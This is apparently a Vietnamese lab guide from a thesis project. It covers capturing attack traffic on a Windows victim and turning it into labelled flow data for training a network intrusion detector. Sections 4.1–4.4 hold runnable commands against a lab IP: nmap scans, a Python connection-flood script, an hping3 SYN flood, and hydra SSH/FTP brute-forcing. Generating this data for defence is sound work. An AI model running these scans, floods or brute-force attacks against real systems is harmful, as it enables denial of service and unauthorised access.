# Hướng dẫn thu dữ liệu TẤN CÔNG — bắt gói phía Windows (victim Win11) — step by step

**Thuộc:** Playbook cải thiện model live — [HUONG_DAN_CAI_THIEN_MODEL_LIVE.md](HUONG_DAN_CAI_THIEN_MODEL_LIVE.md) · **Bước 0 (Phiên 2 — tấn công)**.
**Bổ trợ cho:** [HUONG_DAN_THU_DU_LIEU_BENIGN.md](HUONG_DAN_THU_DU_LIEU_BENIGN.md) (phiên benign, bắt gói trong WSL).
**Mục tiêu:** có `data/analysis/<attack>_real.csv` (nhãn sạch) làm nền cho **Bước 3 (kiểm chứng)** và **Bước 5 (fine-tune)**.

---

## 0. Vì sao phiên tấn công KHÔNG bắt gói trong WSL (khác phiên benign)

Phiên **benign** bắt gói bằng `tcpdump` trong WSL được, vì traffic benign **sinh ra từ chính WSL** (curl/apt/…) nên đi qua `eth0` của WSL.

Phiên **tấn công** thì **ngược lại**: attacker bắn từ ngoài vào **dịch vụ của victim**. Thực nghiệm cho thấy:

- Victim WSL ở chế độ **mirrored** (`eth0 = 192.168.0.103/24`) **chỉ nhận** gói tới **đúng cổng WSL đang mở và qua được Windows Firewall**.
- Gói tới **cổng đóng** hoặc **cổng do Windows sở hữu** (135/139/445/5432…) bị Windows xử lý/drop **trước khi tới WSL** → `tcpdump` trong WSL **không thấy**.
- PortScan bản chất là bắn tới **hàng nghìn cổng đóng** → gần như **toàn bộ vô hình** với WSL (bằng chứng: 1 phiên chỉ bắt được ~1.2k packet trong khi tấn công sinh ~250k packet).

> **Kết luận:** phải **bắt gói ngay tại card mạng Windows** (Npcap/`dumpcap`) — nó thấy **mọi gói** bất kể firewall/cổng. Sau đó vẫn đưa vào **cfm (CICFlowMeter V4)** offline như cũ → CSV **84 cột**, parity với dataset train, 0 domain shift.

```
[Attacker WSL-NAT] --SNAT--> [Attacker Windows 192.168.0.106] --LAN--> [Victim Windows 192.168.0.103]
                                                                              │ dumpcap (Npcap) bắt tại card Wi-Fi
                                                                              ▼  C:\cap\atk.pcap
                                                                     (copy vào WSL: /mnt/c/cap/atk.pcap)
                                                                              │  cfm offline
                                                                              ▼  data/live/atk.pcap_Flow.csv (84 cột)
                                                                              │  consolidate_attack.py (lọc Src IP + tách cổng)
                                                                              ▼  data/analysis/portscan_real.csv + dos_real.csv
```

---

## 1. Topology & IP (đã chốt)

| Vai trò | Máy | IP dùng để tấn công / nhãn |
|---|---|---|
| **Attacker** | Win10, WSL‑NAT `172.20.194.130` → SNAT qua Wi‑Fi | victim thấy **`192.168.0.106`** |
| **Victim** | Win11, WSL mirrored `eth0 = 192.168.0.103/24` | **`192.168.0.103`** |

- Attacker đứng sau WSL‑NAT nên gói ra LAN **bị đổi IP nguồn thành `192.168.0.106`** (Wi‑Fi của host). Victim luôn thấy `Src IP = 192.168.0.106` → dùng IP này để **gán nhãn**.
- `replay_config.json` phải khớp: `attacker_ip = 192.168.0.106`, `victim_ip = 192.168.0.103`.

```bash
# trên attacker (WSL) — xác nhận IP host ra LAN:
powershell.exe -NoProfile -Command "Get-NetIPAddress -AddressFamily IPv4 | Where {\$_.IPAddress -like '192.168.*'} | Select IPAddress,InterfaceAlias"
```

---

## 2. Chuẩn bị (làm 1 lần)

### 2.1 VICTIM (Windows) — công cụ bắt gói
1. Cài **Wireshark** (kèm **Npcap**): https://www.wireshark.org/download.html
   → khi cài Npcap, bật *"Install Npcap in WinPcap API-compatible Mode"*.
2. Kiểm `dumpcap` chạy được + tìm tên interface LAN (thường `Wi-Fi`):
   ```powershell
   & "C:\Program Files\Wireshark\dumpcap.exe" -D
   ```
   Ghi nhớ tên interface mang IP `192.168.0.103` (vd `Wi-Fi`).
3. Tạo thư mục chứa pcap (ổ C để WSL đọc qua `/mnt/c`):
   ```powershell
   mkdir C:\cap
   ```
> Mẹo: thêm `C:\Program Files\Wireshark` vào PATH để gõ `dumpcap` gọn. Nếu không, dùng đường dẫn đầy đủ như trên.

### 2.2 VICTIM (WSL) — cfm để trích xuất flow
```bash
command -v java || echo "!! cai: sudo apt install -y openjdk-8-jre"
CFM_BIN="${CFM_BIN:-/home/ning/CICFlowMeter/build/distributions/CICFlowMeter-4.0/bin/cfm}"
[ -x "$CFM_BIN" ] && echo "OK cfm: $CFM_BIN" || { echo "!! khong thay cfm, tim:"; find / -iname cfm -type f 2>/dev/null | head; }
# cfm o cho khac: export CFM_BIN=/duong/dan/toi/cfm
```

### 2.3 ATTACKER (WSL) — công cụ tấn công
```bash
command -v nmap  || sudo apt install -y nmap
command -v hping3 || sudo apt install -y hping3          # chi can neu dung bien the SYN (can sudo)
ping -c 2 192.168.0.103                                   # phai thay victim
```

### 2.4 Chốt IP trong config (nguồn chân lý)
```bash
cd /home/ning/Graduation-Thesis/live_detection
grep -E 'attacker_ip|victim_ip' replay_config.json
# phai la: attacker_ip=192.168.0.106  victim_ip=192.168.0.103  (sua neu khac)
```

---

## 3. GIAI ĐOẠN 1 — Bật bắt gói (VICTIM / Windows)

Chạy **trước** khi tấn công. Lọc đúng traffic attacker để nhãn sạch, ghi **pcap cổ điển** (`-P`) cho cfm đọc:

```powershell
# tên interface lấy từ mục 2.1 (vd "Wi-Fi")
dumpcap -i "Wi-Fi" -P -f "host 192.168.0.106" -w C:\cap\atk.pcap
```
- `-P` : ghi định dạng **pcap** (không phải pcapng) → cfm V4 đọc được.
- `-f "host 192.168.0.106"` : chỉ bắt gói đi/đến attacker → loại nhiễu benign, nhãn sạch.
- Để chạy tới khi tấn công xong; **`Ctrl-C` để dừng** (Giai đoạn 3).

> Muốn xoay file theo thời gian (phiên dài): thêm `-b duration:60` → sinh `atk_00001_*.pcap`, `atk_00002_*.pcap`…

---

## 4. GIAI ĐOẠN 2 — Phát động tấn công (ATTACKER)

> Ghi lại **mốc giờ bắt đầu/kết thúc từng loại** nếu muốn gán nhãn theo thời gian. **Hoặc** dùng cách **tách theo cổng đích** (mục 6) — bất biến với đồng hồ, khuyến nghị.
> **Nguyên tắc:** mỗi loại tấn công đánh vào **cổng đích khác nhau** để tách nhãn dễ (vd DoS chỉ 1 cổng, PortScan trải nhiều cổng).

### 4.1 Biến thể KHÔNG cần root (chạy được ngay)
```bash
VICTIM=192.168.0.103

# --- PortScan: TCP connect scan (khong can sudo) ---
nmap -sT -T4 -p1-2000 -Pn "$VICTIM"

# --- DoS: connection flood 30s vao 1 cong mo (vd 445) ---
python3 - "$VICTIM" <<'PY'
import socket, sys, time, threading
host=sys.argv[1]; end=time.time()+30; n=[0]; lock=threading.Lock()
def w():
    while time.time()<end:
        try:
            s=socket.socket(); s.settimeout(1); s.connect((host,445)); s.close()
            with lock: n[0]+=1
        except Exception: pass
ts=[threading.Thread(target=w) for _ in range(60)]
[t.start() for t in ts]; [t.join() for t in ts]
print(f"[flood] {n[0]} ket noi trong ~30s")
PY
```

### 4.2 Biến thể SYN (giống CIC hơn, CẦN sudo/mật khẩu)
```bash
sudo nmap -sS -T4 -p1-65535 -Pn 192.168.0.103          # SYN scan full range
sudo hping3 --flood -S -p 445 192.168.0.103            # SYN flood — vai chuc giay roi Ctrl-C
```

### 4.3 (tuỳ chọn) Brute force — khớp lớp "Patator" của CIC
```bash
sudo apt install -y hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.103 -t 4
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.0.103
```

### 4.4 (tuỳ chọn) Tự chấm giờ để gán nhãn theo thời gian
```bash
PAD=5; MARKS=~/attack_windows.txt; : > "$MARKS"
atk(){ label="$1"; shift; s=$(date -d "-$PAD sec" '+%Y-%m-%d %H:%M:%S'); "$@";
       e=$(date -d "+$PAD sec" '+%Y-%m-%d %H:%M:%S');
       printf '    ("%s", "%s", "%s"),\n' "$label" "$s" "$e" | tee -a "$MARKS"; }
# vi du:
atk PortScan nmap -sT -T4 -p1-2000 -Pn 192.168.0.103
atk DoS timeout 30 sudo hping3 --flood -S -p 445 192.168.0.103
```
> ⚠️ Giờ trong `attack_windows.txt` theo **đồng hồ máy attacker**; timestamp trong CSV theo **đồng hồ WSL victim**. Hai máy phải **cùng giờ + cùng timezone** (`date '+%F %T %Z'` trên cả hai). Lệch timezone → sửa: `sudo ln -sf /usr/share/zoneinfo/Asia/Ho_Chi_Minh /etc/localtime`. Không muốn lo → dùng tách theo cổng (mục 6).

---

## 5. GIAI ĐOẠN 3 — Dừng bắt gói + trích xuất flow (VICTIM)

### 5.1 Dừng dumpcap (Windows)
Về cửa sổ PowerShell đang chạy `dumpcap` → **`Ctrl-C`**. Kiểm file:
```powershell
dir C:\cap
```

### 5.2 Đưa pcap vào cfm (WSL) → CSV 84 cột
```bash
cd /home/ning/Graduation-Thesis/live_detection
CFM_BIN="${CFM_BIN:-/home/ning/CICFlowMeter/build/distributions/CICFlowMeter-4.0/bin/cfm}"
mkdir -p data/live
# pcap tren C:\cap thay o /mnt/c/cap trong WSL
"$CFM_BIN" /mnt/c/cap/atk.pcap "$PWD/data/live"
# neu xoay nhieu file: lap qua tung .pcap
# for p in /mnt/c/cap/*.pcap; do "$CFM_BIN" "$p" "$PWD/data/live"; done
ls -1 data/live/*_Flow.csv
```
> cfm sinh `atk.pcap_Flow.csv` trong `data/live/`. Đây là input cho bước gán nhãn.

---

## 6. GIAI ĐOẠN 4 — Gán nhãn sạch (VICTIM / WSL)

Nhãn sạch = **lọc `Src IP == 192.168.0.106`** (chỉ traffic attacker) rồi **tách loại tấn công theo cổng đích** (bất biến đồng hồ).

### 6.1 Cách A — tách theo cổng bằng script có sẵn
Mở [training/consolidate_attack.py](training/consolidate_attack.py), điền `WINDOWS` (dùng cửa sổ rộng + lọc cổng cho DoS):
```python
WINDOWS = [
    ("PortScan", "2026-07-03 00:00:00", "2026-07-04 00:00:00"),        # ca ngay, moi cong
    ("DoS",      "2026-07-03 00:00:00", "2026-07-04 00:00:00", 445),   # cung khung nhung chi cong 445
]
```
> Dòng sau ghi đè dòng trước ở phần trùng → DoS (cổng 445) tách khỏi PortScan. `attacker_ip` script **tự đọc từ `replay_config.json`**.
```bash
python3 training/consolidate_attack.py
```

### 6.2 Cách B — một lệnh tự chứa (không cần sửa file)
```bash
cd /home/ning/Graduation-Thesis/live_detection
python3 - <<'PY'
from pathlib import Path
import numpy as np, pandas as pd, glob, sys
OUT=Path("data/analysis"); OUT.mkdir(parents=True,exist_ok=True)
ATTACKER="192.168.0.106"; DOS_PORT=445
fs=glob.glob("data/live/*.csv")+glob.glob("data/live/processed/*.csv")
if not fs: sys.exit("[!] Khong co CSV trong data/live/. Da chay cfm chua?")
df=pd.concat([pd.read_csv(f,low_memory=False).rename(columns=str.strip) for f in fs],ignore_index=True)
def pick(*c):
    low={x.lower().strip():x for x in df.columns}
    for k in c:
        if k in low: return low[k]
src=pick("src ip","source ip","src_ip"); dpt=pick("dst port","destination port","dst_port")
if not src or not dpt: sys.exit(f"[!] Thieu cot Src IP/Dst Port. Co: {list(df.columns)[:12]}")
atk=df[df[src].astype(str).str.strip()==ATTACKER].copy()
print(f"[*] Tong {len(df)} flow | tu attacker {ATTACKER}: {len(atk)}")
if atk.empty:
    print(df[src].astype(str).str.strip().value_counts().head(8)); sys.exit("[!] 0 flow tu attacker.")
port=pd.to_numeric(atk[dpt],errors="coerce")
atk["Label"]=np.where(port==DOS_PORT,"DoS","PortScan")
n=atk.select_dtypes(include=[np.number])
print(f"[*] Cot(khong Label)={atk.shape[1]-1} (train=84) | NaN={int(n.isna().sum().sum())} inf={int(np.isinf(n.to_numpy(float,na_value=0)).sum())}")
for name,g in atk.groupby("Label"):
    f=OUT/f"{name.lower()}_real.csv"; g.to_csv(f,index=False); print(f"[+] {f.name}: {len(g)} flow")
PY
```

### 6.3 Kiểm kết quả
```bash
ls -lh data/analysis/*_real.csv
wc -l data/analysis/dos_real.csv data/analysis/portscan_real.csv
```

---

## 7. Tiêu chí Done (Phiên 2)
- [ ] `dumpcap` bắt được **>> vài nghìn packet** (không phải ~1k như bắt trong WSL) — kiểm `dir C:\cap` thấy file lớn.
- [ ] cfm sinh `*_Flow.csv` **84 cột** trong `data/live/`.
- [ ] `consolidate_attack.py` báo **>0 flow từ 192.168.0.106**.
- [ ] `data/analysis/<attack>_real.csv` có ít nhất **1–2 loại** nhãn sạch (vd `portscan_real.csv`, `dos_real.csv`).

---

## 8. Cạm bẫy thường gặp
- **Bắt gói trong WSL cho tấn công** → chỉ thấy ~1k packet (WSL mù với gói tới cổng Windows/đóng). **Phải** dùng `dumpcap` trên Windows.
- **Quên `-P`** → dumpcap ghi pcapng, cfm V4 có thể không đọc. Luôn `-P`.
- **Quên `-f "host 192.168.0.106"`** → pcap dính benign của cả LAN → bẩn nhãn.
- **Sai tên interface** (`dumpcap -i`) → bắt nhầm card không có traffic. Kiểm `dumpcap -D`, chọn card mang IP `192.168.0.103`.
- **0 flow từ attacker** → attacker_ip sai (NAT ánh xạ IP khác `.106`): xem danh sách Src IP script in ra, cập nhật `replay_config.json`.
- **DoS áp đảo PortScan** (vd 50k vs 2k) → khi fine-tune nên **undersample** lớp DoS cho cân bằng.
- **Lệch timezone 2 máy** (nếu gán nhãn theo thời gian) → dùng **tách theo cổng** (mục 6) để khỏi phụ thuộc đồng hồ.
- **cfm chunk quá ngắn** không phải vấn đề ở đây (bắt cả phiên vào 1 pcap); nhưng pcap quá lớn → dùng `-b duration:60` xoay file rồi lặp cfm.

---

## 9. Bước tiếp theo
Có `<attack>_real.csv` (+ `benign_real.csv`/`benign_val.csv` từ Phiên 1) → sang:
- **Bước 3 — Kiểm chứng:** đưa flow tấn công thật qua model V8.5, đo recall/nhầm lẫn theo lớp.
- **Bước 5 — Fine-tune:** trộn benign thật + attack thật (cân bằng lớp) để giảm covariate shift.

Chi tiết trong [HUONG_DAN_CAI_THIEN_MODEL_LIVE.md](HUONG_DAN_CAI_THIEN_MODEL_LIVE.md).
